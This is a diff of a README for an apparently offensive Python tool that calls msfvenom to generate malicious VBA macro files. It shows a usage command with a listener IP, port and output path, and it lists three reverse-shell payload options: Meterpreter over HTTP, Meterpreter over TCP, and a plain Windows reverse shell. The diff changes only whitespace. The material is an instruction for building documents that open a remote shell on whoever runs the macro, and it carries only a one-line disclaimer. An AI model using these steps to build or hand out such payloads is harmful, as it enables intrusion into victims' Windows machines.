@@ -17,14 +17,22 @@ NB : Please don't use this for illegal activity
 
 # How to use
 Python main.py -p 1 -L 192.168.1.17 -P 80 -o /home/kali/Desktop/test.vba
+
  -p : Is for the choice of payload
+ 
       1 -> windows/meterpreter/reverse_http
+      
       2 -> windows/meterpreter/reverse_tcp
+      
       3 -> windows/shell_reverse_tcp
       
+      
  -L : Is for the ip of listener
+ 
  -P : Is for the port of listener
+ 
  -o : Is for the destination output of payload
+ 
  
  The tools use msfvenom to generate payload.
 
